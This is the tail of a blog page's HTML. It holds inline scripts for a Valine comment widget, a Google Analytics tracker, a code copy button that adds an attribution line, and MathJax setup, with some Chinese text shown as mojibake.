Valine({el:"#vcomments",verify:!1,notify:!1,appId:"sK4BUsDgfSB843HYgJyTcV7P-gzGzoHsz",appKey:"NKNx8m2CtFeDofr8LNLX7aNG",placeholder:"æ¥æ¥æ¥è¯´ç‚¹å•¥~~\r\nå¯¹ä½ æœ‰ç”¨ï¼Ÿèµä¸€æ³¢ï¼â†˜â†˜",avatar:"mp",meta:meta,pageSize:"10",visitor:!0})</script><script defer type="text/javascript">!function(e,a,t,n,g,c){e.GoogleAnalyticsObject=n,e.ga=e.ga||function(){(e.ga.q=e.ga.q||[]).push(arguments)},e.ga.l=+new Date,g=a.createElement(t),c=a.getElementsByTagName(t)[0],g.async=1,g.src="//www.google-analytics.com/analytics.js",c.parentNode.insertBefore(g,c)}(window,document,"script","ga"),ga("create","UA-165804489-1","auto"),ga("send","pageview")</script><style>.copy-btn{display:inline-block;padding:6px 12px;font-size:13px;font-weight:700;line-height:20px;color:#333;white-space:nowrap;vertical-align:middle;cursor:pointer;background-color:#eee;background-image:linear-gradient(#fcfcfc,#eee);border:1px solid #d5d5d5;border-radius:3px;user-select:none;outline:0}.highlight-wrap .copy-btn{transition:opacity .3s ease-in-out;opacity:0;padding:2px 6px;position:absolute;right:4px;top:8px;z-index:2}.highlight-wrap .copy-btn:focus,.highlight-wrap:hover .copy-btn{opacity:1}.highlight-wrap{position:relative}</style><script>addLoadEvent(()=>{$(".highlight").each(function(t,e){var n=$("<div>").addClass("highlight-wrap");$(e).after(n),n.append($("<button>").addClass("copy-btn").append("å¤åˆ¶").on("click",function(t){var e=$(this).parent().find(".code")[0].innerText;e+="\n/**\n* å¤åˆ¶å¹¶ä½¿ç”¨ä»£ç è¯·æ³¨æ˜å¼•ç”¨å‡ºå¤„å“¦~\n* Lazzaro @ https://lazzzaro.github.io\n*/";var n=document.createElement("textarea");document.body.appendChild(n),n.style.position="absolute",n.style.top="0px",n.style.left="0px",n.value=e,n.select(),n.focus();e=document.execCommand("copy");document.body.removeChild(n),e?$(this).text("å¤åˆ¶æˆåŠŸ"):$(this).text("å¤åˆ¶å¤±è´¥"),$(this).blur()})).on("mouseleave",function(t){var e=$(this).find(".copy-btn");setTimeout(function(){e.text("å¤åˆ¶")},300)}).append(e)})})</script><script type="text/x-mathjax-config">MathJax.Hub.Config({
        tex2jax: {
            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
            processEscapes: true
        }
    });
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax();
        for (var i = 0; i < all.length; ++i)
            all[i].SourceElement().parentNode.className += ' has-jax';
    });</script><script src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script></body></html>